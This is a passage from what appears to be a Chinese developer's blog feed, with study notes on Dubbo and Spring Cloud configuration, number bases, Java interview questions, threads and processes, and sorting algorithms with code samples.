protocol="zookeeper" address="127.0.0.1:2181">&lt;/dubbo:registry></span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> RegistryConfig <span class="token function">registryConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        RegistryConfig registryConfig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegistryConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registryConfig<span class="token punctuation">.</span><span class="token function">setProtocol</span><span class="token punctuation">(</span><span class="token string">"zookeeper"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registryConfig<span class="token punctuation">.</span><span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1:2181"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> registryConfig<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//&lt;dubbo:protocol name="dubbo" port="20882">&lt;/dubbo:protocol></span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> ProtocolConfig <span class="token function">protocolConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ProtocolConfig protocolConfig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProtocolConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        protocolConfig<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"dubbo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        protocolConfig<span class="token punctuation">.</span><span class="token function">setPort</span><span class="token punctuation">(</span><span class="token number">20882</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> protocolConfig<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     *&lt;dubbo:service interface="com.atguigu.gmall.service.UserService"         ref="userServiceImpl01" timeout="1000" version="1.0.0">        &lt;dubbo:method name="getUserAddressList" timeout="1000">&lt;/dubbo:method>    &lt;/dubbo:service>     */</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> ServiceConfig<span class="token operator">&lt;</span>UserService<span class="token operator">></span> <span class="token function">userServiceConfig</span><span class="token punctuation">(</span>UserService userService<span class="token punctuation">)</span><span class="token punctuation">{</span>        ServiceConfig<span class="token operator">&lt;</span>UserService<span class="token operator">></span> serviceConfig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServiceConfig</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        serviceConfig<span class="token punctuation">.</span><span class="token function">setInterface</span><span class="token punctuation">(</span>UserService<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        serviceConfig<span class="token punctuation">.</span><span class="token function">setRef</span><span class="token punctuation">(</span>userService<span class="token punctuation">)</span><span class="token punctuation">;</span>        serviceConfig<span class="token punctuation">.</span><span class="token function">setVersion</span><span class="token punctuation">(</span><span class="token string">"1.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//配置每一个method的信息</span>        MethodConfig methodConfig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MethodConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodConfig<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"getUserAddressList"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methodConfig<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将method的设置关联到service配置中</span>        List<span class="token operator">&lt;</span>MethodConfig<span class="token operator">></span> methods <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        methods<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>methodConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>        serviceConfig<span class="token punctuation">.</span><span class="token function">setMethods</span><span class="token punctuation">(</span>methods<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ProviderConfig</span>        <span class="token comment" spellcheck="true">//MonitorConfig</span>        <span class="token keyword">return</span> serviceConfig<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>service实现服务暴露</p><p>注意不要引错springservice包</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Service<span class="token punctuation">;</span><span class="token annotation punctuation">@Service</span><span class="token comment" spellcheck="true">//暴露服务 </span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span></code></pre><p>zookeeper宕机后，是否还可以消费dubbo暴露服务（高可用，减少系统不能服务时间）？</p><p>可以，当第一次连接上注册中心后，当全部注册中心宕机后，服务提供者和消费者仍然可以通过本地缓存通讯</p><p>无注册中心也可以通过dubbo直连连接</p><p>消费者引用提供者服务</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Reference</span>UserService userService<span class="token punctuation">;</span></code></pre><p>dubbo直连配置</p><p>url为提供者地址</p><pre><code>@Reference(url:&quot;127.0.0.1:20882&quot;) //dubbo直连UserService userService;</code></pre><h4 id="dubbo负载均衡机制"><a href="#dubbo负载均衡机制" class="headerlink" title="dubbo负载均衡机制"></a>dubbo负载均衡机制</h4><p>默认根据权重随机轮询机制random</p><p>设置负载均衡轮询roundrobin</p><pre><code>@Reference(loadbalance=&quot;random&quot;,timeout=1000) //dubbo直连UserService userService;</code></pre><h4 id="权重调节"><a href="#权重调节" class="headerlink" title="权重调节"></a>权重调节</h4><p>在service设置权重（固定设置）或者在可视化控制端调节（动态权重）</p><h4 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h4><p><strong>什么是服务降级？</strong></p><p><strong>当服务器压力剧增的情况下，根据实际业务情况及流量，对一些服务和页面有策略的不处理或换种简单的方式处理，从而释放服务器资源以保证核心交易正常运作或高效运作。</strong></p><p>可以通过服务降级功能临时屏蔽某个出错的非关键服务，并定义降级后的返回策略。</p><p>向注册中心写入动态配置覆盖规则：</p><pre class=" language-java"><code class="language-java">RegistryFactory  registryFactory <span class="token operator">=</span>  ExtensionLoader<span class="token punctuation">.</span><span class="token function">getExtensionLoader</span><span class="token punctuation">(</span>RegistryFactory<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAdaptiveExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Registry registry <span class="token operator">=</span> registryFactory<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span>URL<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token string">"zookeeper://10.20.153.10:2181"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> registry<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>URL<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token string">"override://0.0.0.0/com.foo.BarService?category=configurators&amp;dynamic=false&amp;application=foo&amp;mock=force:return+null"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre><p>其中：</p><p>l mock=force:return+null 表示消费方对该服务的方法调用都直接返回 null 值，不发起远程调用。用来屏蔽不重要服务不可用时对调用方的影响。</p><p>例如 当oder-consumer设置屏蔽后，调用不进行远程调用直接返回null</p><p>l 还可以改为 mock=fail:return+null 表示消费方对该服务的方法调用在失败后，再返回 null 值，不抛异常。用来容忍不重要服务不稳定时对调用方的影响。</p><p>例如 当oder-consumer设置容错后，调用进行远程调用失败后返回null(比如访问时间超时)</p><h4 id="集群容错"><a href="#集群容错" class="headerlink" title="集群容错"></a>集群容错</h4><p>一、设置重试次数等</p><p>二、实际开发中整合hystrix进行容错</p>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进制基础知识</title>
      <link href="/2022/01/22/jin-zhi-ji-chu-zhi-shi/"/>
      <url>/2022/01/22/jin-zhi-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h4 id="1-十六进制，6-3为什么等12，怎么算"><a href="#1-十六进制，6-3为什么等12，怎么算" class="headerlink" title="1.十六进制，6*3为什么等12，怎么算"></a>1.十六进制，6*3为什么等12，怎么算</h4><p>通常我们用的是十进制:每到10就进一位,所以6<em>3=10+8<br>而时十六进制:每到十六就进一位,所以6</em>3=10(16=10)+2<br>也就是说在十六进制中16就相当于我们通常使用的十进制中的10（<strong>10进制是见10进1，16进制是见16进1</strong>）</p><p><strong>6进制</strong>：0,1,2,3,4,5（不能有超过，也就是说6进制的数在某一位上不能含有超过“6”的数，同理其他进制一样）</p><p>10进制和12进制得到相同数值，<strong>10进制的要比12进制的数值大</strong>，因为十进制每逢“10”进一，十二进制每逢“12”进一；</p>]]></content>
      
      
      <categories>
          
          <category> 进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试题</title>
      <link href="/2022/01/19/mian-shi-ti/"/>
      <url>/2022/01/19/mian-shi-ti/</url>
      
        <content type="html"><![CDATA[<p><strong>1.以下属于Redis支持的数据类型是（ ）</strong></p><ul><li><pre><code>Strings</code></pre></li><li><pre><code>Lists</code></pre></li><li><pre><code>Sets</code></pre></li><li><blockquote><pre><code>集合排序</code></pre></blockquote></li></ul><p>解析：</p><p>redis一共包含5种数据类型 </p><p>  ①字符串 String （最基本的类型，可包含任意数据） </p><p>  ②哈希 Hash （String类型的field、value映射表） </p><p>  ③列表 List （字符串列表,有序不唯一） </p><p>  ④集合 set （字符串集合，无序唯一） </p><p>  ⑤集合排序 (有序集合sorted sets)（字符串集合，可以通过设置分数score进行排序） </p><p><strong>2.当你在浏览器地址栏输入一个URL后回车，将会发生的事情？</strong></p><pre><code>    1.浏览器向DNS服务器查找输入URL对应的IP地址。    2.DNS服务器返回网站的IP地址。    3.浏览器根据IP地址与目标web服务器在80端口上建立TCP连接    4.浏览器获取请求页面的html代码。    5.浏览器在显示窗口内渲染HTML。    6.窗口关闭时，浏览器终止与服务器的连接。这其中最有趣的是第1步和第2步(域名解析)。我们输入的网址(域名)是IP地址的一个别名， 在一个DNS内，一个域名对应一个IP地址。域名系统(DNS) 的工作就是将域名与它的IP地址对应起来。DNS是分布式的，同时也是具有层级关系的。一个域名服务器虽然只记录一个小的子网内的主机名和IP地址， 但所有的域名服务器联合起来工作，就能将全网内的域名与它们的IP地址对应起来。 这也就意味着，如果一个域名服务器无法找到某个请求域名所对应的IP地址， 它就会向其它的域名服务器发出请求进行寻找。</code></pre><p><img src="assets/image-20220119113922644.png" alt="image-20220119113922644"></p><p><strong>3.如何提高服务器响应速度</strong></p><pre><code>一、服务器周围环境　　服务器通常放置于机房，所说的周围环境也正是指机房。服务器基本是一天24小时不间断运行，所需要的电量如果没有得到足够保证，那么宕机的可能性就会增加。　　其次，一台不停运转的机器，会产生大量的热量，如果机房不能给予足够的散热与湿度保持，机器便会故障，对运行速度也会有很大影响。　　最后，在服务器配置相同的情况下，机房的带宽越大，访问速度相对越快。　二、本身配置　　服务器对非专业人员一直是难以理解的机器，但如果将其转化为我们熟知的东西就很好理解了。我们可以将服务器看做一台普通计算机，计算机中的处理器、内存和宽带都直接影响了其运行速度。　　因此，想要提升服务器速度，可以对这些硬件进行升级，做好维护，如果速度下降，也可以从这些方面进行排查。三、网站程序　　程序代码对速度影响也很大。代码越精简，所占用空间便会越小，访问速度便会越快。通常来说，编码人员都会有一个书写标准，但因为个人习惯问题而凭空多出许多冗余代码，导致速度被拖慢。壹基比观观 　　1. 对传输数据进行压缩处理，降低了网络传输的数据量。　　2. （减少HTTP请求数我们可以通过减少外部各类文件的数量调用次数来达到其目的）减少http：js、css、图片和flash等文件每一类下载都相当于一次HTTP请求，使用外部的JS和CSS，将内联的JS和CSS做成外部的JS、CSS。减少重复下载内联的JS和CSS。也可一可以直接把css和js写入到html页面中，避免了外部的调用;   　　3.使用浏览器缓存，在用户浏览网站的不同页面时，很多[[在本地缓存这些文件，将大大降低页面产生的流量，从而降低页面载入时间。　　4.减少与数据库的交互。　　5.控制程序的优化。　　6.采用多台服务器提高并行加载量四、优化服务器并发处理能力，提高吞吐量，提高CPU并发计算能力（多进程&amp;多线程）</code></pre><p><strong>4.java基本数据类型</strong></p><p>1、整型：byte 、int 、long 、short </p><p>2、浮点型：float 、 double</p><p>3、字符型：char</p><p>4、布尔型：boolean</p><p><strong>5.下面有关SPRING的事务传播特性，说法错误的是？</strong></p><p> A)PROPAGATION_SUPPORTS：支持当前事务，如果当前没有事务，就以非事务方式执行<br> B)PROPAGATION_REQUIRED：支持当前事务，如果当前没有事务，就抛出异常<br> C)PROPAGATION_REQUIRES_NEW：新建事务，如果当前存在事务，把当前事务挂起<br> D)PROPAGATION_NESTED：支持当前事务，新增Savepoint点，与当前事务同步提交或回滚</p><pre><code>    答案：B    解析：Spring的API设计很不错，基本上根据英文翻译就能知道作用:Required:必须的。说明必须要有事物，没有就新建事物。supports:支持。说明仅仅是支持事务，没有事务就非事务方式执行。mandatory:强制的。说明一定要有事务，没有事务就抛出异常。required_new:必须新建事物。如果当前存在事物就挂起。not_supported:不支持事物，如果存在事物就挂起。never:绝不有事务。如果存在事物就抛出异常</code></pre><p><strong>6.switch 是否能作用在 byte 、<em>long<em>、</em>String</em> ?</strong></p><ul><li>switch可作用于byte int short char<br>switch可作用于byte int short char 对应的包装类</li><li>switch中可以是枚举类型(<strong>JDK1.5</strong>之后)</li><li>switch中可以是字符串类型,String(<strong>JDK1.7</strong>之后才可以作用在string上)</li></ul><p><strong>7.抽象类(abstract class)和接口(interface)有什么异同？</strong></p><p><strong>同：</strong>1.抽象类和接口都不能实例化，但可以定义抽象类和接口的引用。</p><p>​        2.一个类如果实现了某个抽象类或者接口都需要对其中的抽象方法全部实现，否则该类仍然需要声明抽象类。</p><p><strong>异：</strong>1.接口比抽象类更加抽象，抽象类可以定义构造器，可以有抽象方法和具体方法。而接口全部都是抽象方法。</p><p>​        2.抽象类的成员可以是private，protected，public，而接口中的成员变量全部是public。</p><p>​        3.抽象类中可以定义成员变量，而接口定义的成员变量实际上都是常量。</p><p>​        4.有抽象方法的类必须声明抽象类，抽象类未必有抽象方法。</p><pre><code>在抽象类中定义构造方法abstract class Person{    private String name;    public Person(){    System.out.println(&quot;hello,jack&quot;);}public String getName(){    return name;}public void setName(String name){    this.name = name;}public abstract void getPersoninfo();}class Student extends Person(){    public Student(){        System.out.println(&quot;helllo,tom&quot;);    }    public void getPersoninfo(){        }    }     public class Test8(){    public static void main(String[] args){        Person per = new Person();      per.Person();      Student stu = new Student();       stu.Student();    }}</code></pre><p><strong>8.静态嵌套类（static nested class）和内部类（inner class）的不同？</strong></p><p>静态嵌套类是被声明为静态的内部类，他可以不依赖外部类实例被实例化。而通常的内部类需要在外部实例化后才能实例化。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础知识</title>
      <link href="/2022/01/18/java-ji-chu-zhi-shi/"/>
      <url>/2022/01/18/java-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h2 id="一、重写和重载"><a href="#一、重写和重载" class="headerlink" title="一、重写和重载"></a>一、重写和重载</h2><h4 id="1-重写-运行时的多态性"><a href="#1-重写-运行时的多态性" class="headerlink" title="1.重写(运行时的多态性)"></a>1.<strong>重写</strong>(运行时的多态性)</h4><p>1.发生在父类与子类之间<br>2.方法名，参数列表，返回类型（除过子类中方法的返回类型是父类中返回类型的子类）必须相同<br>3.访问修饰符的限制一定要大于被重写方法的访问修饰符（public&gt;protected&gt;default&gt;private)<br>4.重写方法一定不能抛出新的检查异常或者比被重写方法申明更加宽泛的检查型异常</p><h4 id="2-重载-编译时的多态性"><a href="#2-重载-编译时的多态性" class="headerlink" title="2.重载(编译时的多态性)"></a>2.重载(编译时的多态性)</h4><p>在一个类中，同名的方法如果有不同的参数列表（<strong>参数类型不同、参数个数不同甚至是参数顺序不同</strong>）<strong>（同名不同参）</strong>则视为重载。同时，重载对返回类型没有要求，可以相同也可以不同，但<strong>不能通过返回类型是否相同来判断重载</strong>。 </p><p><strong>方法重载只能发生在一个类的内部</strong></p><p><strong>构造方法能重载，静态方法也能重载</strong></p><h4 id="3-重载（Overload）和重写（Override）的区别？"><a href="#3-重载（Overload）和重写（Override）的区别？" class="headerlink" title="3.重载（Overload）和重写（Override）的区别？"></a>3.重载（Overload）和重写（Override）的区别？</h4><p>答：<strong>方法的重载和重写都是实现多态的方式</strong>，区别在于前者实现的是<strong>编译时</strong>的多态性，而后者实现的是<strong>运行时</strong>的多态性。</p><p>重载发生在一个类中，同名的方法如果有不同的参数列表（参数类型不同、参数个数不同或者二者都不同）则视为重载；</p><p>重写发生在子类与父类之间，重写要求子类被重写方法与父类被重写方法有相同的参数列表，有兼容的返回类型，比父类被重写方法更好访问，不能比父类被重写方法声明更多的异常（里氏代换原则）。重载对返回类型没有特殊的要求，不能根据返回类型进行区分。</p><h4 id="4-构造方法没有返回值。"><a href="#4-构造方法没有返回值。" class="headerlink" title="4.构造方法没有返回值。"></a><strong>4.构造方法没有返回值。</strong></h4><h4 id="5-成员方法又称为实例方法，静态方法又称为类方法"><a href="#5-成员方法又称为实例方法，静态方法又称为类方法" class="headerlink" title="5.成员方法又称为实例方法，静态方法又称为类方法"></a>5.成员方法又称为实例方法，静态方法又称为类方法</h4><h4 id="6-方法与函数"><a href="#6-方法与函数" class="headerlink" title="6.方法与函数"></a>6.方法与函数</h4><p>这两个概念不严格区分，就是一个东西，通过对象调用的，就是方法，直接调用，就是函数；</p><h4 id="7-for循环，break之后不执行i-，而continue之后会执行i"><a href="#7-for循环，break之后不执行i-，而continue之后会执行i" class="headerlink" title="7.for循环，break之后不执行i++，而continue之后会执行i++"></a>7.for循环，break之后不执行i++，而continue之后会执行i++</h4><h4 id="8-int和Integer的区别"><a href="#8-int和Integer的区别" class="headerlink" title="8.int和Integer的区别"></a>8.<a href="https://www.cnblogs.com/guodongdidi/p/6953217.html" target="_blank" rel="noopener">int和Integer的区别</a></h4><p>1、Integer是int的包装类，int则是java的一种基本数据类型<br>2、Integer变量必须实例化后才能使用，而int变量不需要<br>3、Integer实际是对象的引用，当new一个Integer时，实际上是生成一个指针指向此对象；而int则是直接存储数据值<br>4、Integer的默认值是null，int的默认值是0</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程与进程</title>
      <link href="/2022/01/18/xian-cheng-yu-jin-cheng/"/>
      <url>/2022/01/18/xian-cheng-yu-jin-cheng/</url>
      
        <content type="html"><![CDATA[<h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><p>1、<strong>进程是系统进行资源分配和调度的基本单位，线程是CPU调度和分配的基本单位</strong></p><p>2、<strong>一个线程可以创建和撤消另一个线程</strong>，同一进程中的多个线程之间可以并发执行。</p><p>3、进程在执行过程中拥有独立的内存单元，而该进程的多个线程共享内存，从而极大地提高了程序的运行效率。 </p><p>4、<strong><em>同属</em>一个进程的<em>其他的线程</em>共享进程所拥有的全部资源.</strong> </p><p>5、<strong>多线程和多进程都会引发死锁</strong></p><h2 id="二、线程与进程"><a href="#二、线程与进程" class="headerlink" title="二、线程与进程"></a>二、线程与进程</h2><p>1、线程和进程一样分为五个阶段：<strong>创建、就绪、运行、阻塞、终止</strong>。</p><p>2、多进程是指操作系统能同时运行多个任务（程序）。<br>      多线程是指在同一程序中有多个顺序流在执行。</p><p>3、</p><h2 id="三、进程与线程的区别"><a href="#三、进程与线程的区别" class="headerlink" title="三、进程与线程的区别"></a>三、进程与线程的区别</h2><p>（1）调度：线程作为<strong>调度和分配</strong>的基本单位，进程作为<strong>拥有资源</strong>的基本单位</p><p>（2）并发性：不仅进程之间可以并发执行，同一个进程的多个线程之间也可并发执行</p><p>（3）拥有资源：进程是拥有资源的一个独立单位，<strong>线程不拥有系统资源</strong>，但可以访问隶属于进程的资源.</p><p>（4）系统开销：在<strong>创建或撤消进程</strong>时，由于系统都要为之分配和回收资源，导致系统的开销明显大于创建或撤消线程时的开销</p><h2 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h2><p>1、java中实现Runnable类的线程体应该写在run()方法体中。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2022/01/14/pai-xu-suan-fa/"/>
      <url>/2022/01/14/pai-xu-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="一、冒泡排序"><a href="#一、冒泡排序" class="headerlink" title="一、冒泡排序"></a>一、冒泡排序</h2><p>其实现原理是重复扫描待排序序列，并比较每一对相邻的元素，当该对元素顺序不正确时进行交换。一直重复这个过程，直到没有任何两个相邻元素可以交换，就表明完成了排序。复杂度为 2^n</p><pre><code>for(i = nums.length-1; i&gt;0; i--){    for(j = 0; j&lt;i; j++){        if(nums[j] &gt; nums[j+1]){            int temp = nums[j];            nums[j] = nums[j+1];            nums[j+1] = temp;        }            }}</code></pre><h2 id="二、快速排序"><a href="#二、快速排序" class="headerlink" title="二、快速排序"></a>二、快速排序</h2><p>快速排序是冒泡排序的一种优化。</p><pre><code>/* * 快速排序 * * 参数说明： *     a -- 待排序的数组 *     l -- 数组的左边界(例如，从    +-起始位置开始排序，则l=0) *     r -- 数组的右边界(例如，排序截至到数组末尾，则r=a.length-1) */void quick_sort(int a[], int l, int r){    if (l &lt; r)    {        int i,j,x;        i = l;        j = r;        x = a[i];        while (i &lt; j)        {            while(i &lt; j &amp;&amp; a[j] &gt; x)                j--; // 从右向左找第一个小于x的数            if(i &lt; j)                a[i++] = a[j];            while(i &lt; j &amp;&amp; a[i] &lt; x)                i++; // 从左向右找第一个大于x的数            if(i &lt; j)                a[j--] = a[i];        }        a[i] = x;        quick_sort(a, l, i-1); /* 依据a[i]分为左边并对左边进行递归调用 */        quick_sort(a, i+1, r); /* 依据a[i]分为右边并对右边进行递归调用 */    }}</code></pre><h2 id="三、选择排序"><a href="#三、选择排序" class="headerlink" title="三、选择排序"></a>三、选择排序</h2><p>选择排序(Selection  sort)是一种简单直观的排序算法。其基本思想是：首先在未排序的数列中找到最小(or最大)元素，然后将其存放到数列的起始位置；接着，再从剩余未排序的元素中继续寻找最小(or最大)元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。 </p><p>选择排序的时间复杂度是 n^2 ：假设被排序的数列中有N个数。遍历一趟的时间复杂度是O(N)，需要遍历多少次呢？N-1次因此，选择排序的时间复杂度是 n^2 。</p><p>选择排序是稳定的算法，它满足稳定算法的定义：假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！</p><p>引用于：通俗易懂讲解 选择排序 - 忆臻的文章 - 知乎 <a href="https://zhuanlan.zhihu.com/p/29889599" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/29889599</a></p><pre><code>/* * 选择排序 *  * 参数说明：  *     a -- 待排序的数组  *     n -- 数组的长度  */void select_sort(int a[], int n){    int i;        // 有序区的末尾位置    int j;        // 无序区的起始位置    int min;    // 无序区中最小元素位置    for(i=0; i&lt;n; i++)    {        min=i;        //找&quot;a[i+1]..a[n]&quot;之间最小元素，并赋给min        for(j=i+1; j&lt;n; j++)        {            if(a[j] &lt; a[min])                min=j;        }        //若min!=i，则交换 a[i] 和 a[min]。        //交换后，保证了a[0]..a[i]之间元素有序。        if(min != i)            swap(a[i], a[min]);    }}</code></pre><h2 id="四、归并排序"><a href="#四、归并排序" class="headerlink" title="四、归并排序"></a>四、归并排序</h2><p>把两个或多个已经有序的序列合并成一个，时间复杂度O(nlog n)，空间复杂度O(n)，归并排序是稳定的。</p><pre><code>int *B = (int *)malloc(n*sizeof(int));//辅助函数B//A[low_mid]和A[mid+1...high]各自有序，将两个部分归并void Merge(int A[],int low,int mid,int high){    int i,j,k;    //复制数组    for(k = low;k&lt;=high;k++)        B[k] = A[k];    //选择判断排序        for(i=low,j=mid+1,k=i;i&lt;=mid&amp;&amp;j&lt;=high;k++){        if(B[i]&lt;=B[j]){            A[k] = B[i++];        }else{            A[k] = B[j++];        }    }    //对剩下部分有序序列进行复制    while(i&lt;=mid) A[k++] = B[i++];    while(i&lt;=high) A[k++] = B[j++];}//使用递归的方式调用void MergeSort(int A[],int low,int high){    if(low&lt;high){        int mid = (low + high)/2;        MergeSort(A,low,mid);//对左半部分归并排序        MergeSort(A,mid+1,high);//对右半部分归并排序        Merge(A,low,mid,high);//归并    }}</code></pre><h2 id="五、插入排序"><a href="#五、插入排序" class="headerlink" title="五、插入排序"></a>五、插入排序</h2><p>插入排序的平均时间复杂度也是 O(n^2)，空间复杂度为常数阶 O(1)，具体时间复杂度和数组的有序性也是有关联的。</p><p>判断当前数值与前一个数值的大小，如果小于则替换，一直循环比较并替换完成最小的值，然后进入下一次循环。</p><pre><code>for (int i = 0; i &lt; n; i++) {    // 寻找元素 arr[i] 合适的插入位置   for( int j = i ; j &gt; 0 ; j -- )        if( arr[j].compareTo( arr[j-1] ) &lt; 0 )//arr[j] &lt; arr[j-1]            swap( arr, j , j-1 );        else            break;}private static void swap(Object[] arr, int i, int j) {        Object t = arr[i];        arr[i] = arr[j];        arr[j] = t;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringCloud配置与详解</title>
      <link href="/2021/12/25/springcloud-pei-zhi-yu-xiang-jie/"/>
      <url>/2021/12/25/springcloud-pei-zhi-yu-xiang-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Springcloud介绍"><a href="#一、Springcloud介绍" class="headerlink" title="一、Springcloud介绍"></a>一、Springcloud介绍</h3><p>pring Cloud是一系列框架的<a href="https://baike.baidu.com/item/有序集合/994839" target="_blank" rel="noopener">有序集合</a>。它利用Spring  Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。Spring  Cloud并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring  Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p><p>下面只简单介绍下经常用的5个</p><p><strong>服务发现</strong>——Netflix Eureka</p><p><strong>客服端负载均衡</strong>——Netflix Ribbon</p><p><strong>断路器</strong>——Netflix Hystrix</p><p><strong>服务网关</strong>——Netflix Zuul</p><p><strong>分布式配置</strong>——Spring Cloud Config</p><h3 id="二、Springcloud自我保护机制"><a href="#二、Springcloud自我保护机制" class="headerlink" title="二、Springcloud自我保护机制"></a>二、Springcloud<strong>自我保护机制</strong></h3><pre><code>EMERGENCYI EUREKA MAY BE INCORRECTLY CLAIMING INSTANCES ARE UP WHEN THEY&#39; RE NOT. RENEWALS ARE LESSE</code></pre><p>这是触发了Eureka的自我保护机制。当服务未按时进行心跳续约时，Eureka会统计服务实例最近15分钟心跳续约的比例是否低于了85%。在生产环境下，因为网络延迟等原因，心跳失败实例的比例很有可能超标，但是此时就把服务剔除列表并不妥当，因为服务可能没有宕机。Eureka在这段时间内不会剔除任何服务实例，直到网络恢复正常。生产环境下这很有效，保证了大多数服务依然可用，不过也有可能获取到失败的服务实例，因此服务调用者必须做好服务的失败容错，一句话讲解：<strong>好死不如赖活着</strong></p><p>综上，自我保护模式是一种应对网络异常的安全保护措施。它的架构哲学是宁可同时保留所有微服务（健康的微服务和不健康的微服务都会保留），也不盲目注销任何健康的微服务。使用自我保护模式，可以让Eureka集群更加的健壮、稳定。</p><p>因此服务调用者必须做好服务的失败容错，可以通过在yml中配置来关停自我保护（<strong>不建议</strong>）：</p><pre><code>eureka：  server：​    enable-self-preservation:false#关闭自我保护模式（缺省为打开）</code></pre><h3 id="Springcloud配置案例"><a href="#Springcloud配置案例" class="headerlink" title="Springcloud配置案例"></a>Springcloud配置案例</h3><h4 id="1-EurekaServer（服务注册中心）"><a href="#1-EurekaServer（服务注册中心）" class="headerlink" title="1.EurekaServer（服务注册中心）"></a>1.EurekaServer（服务注册中心）</h4><h5 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h5><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span 